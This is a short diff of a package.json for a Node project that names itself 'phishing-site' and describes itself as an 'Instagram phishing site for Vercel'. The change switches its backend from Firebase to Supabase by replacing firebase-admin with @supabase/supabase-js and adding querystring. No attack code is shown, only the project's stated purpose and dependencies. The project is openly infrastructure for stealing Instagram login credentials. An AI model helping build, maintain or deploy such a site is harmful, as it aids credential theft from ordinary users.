@@ -1,10 +1,11 @@
 {
     "name": "phishing-site",
     "version": "1.0.0",
-    "description": "Instagram phishing site for Vercel with Firebase",
+    "description": "Instagram phishing site for Vercel with Supabase",
     "dependencies": {
         "node-fetch": "^2.6.7",
-        "firebase-admin": "^11.5.0"
+        "@supabase/supabase-js": "^2.39.0",
+        "querystring": "^0.2.1"
     },
     "scripts": {
         "start": "vercel dev"
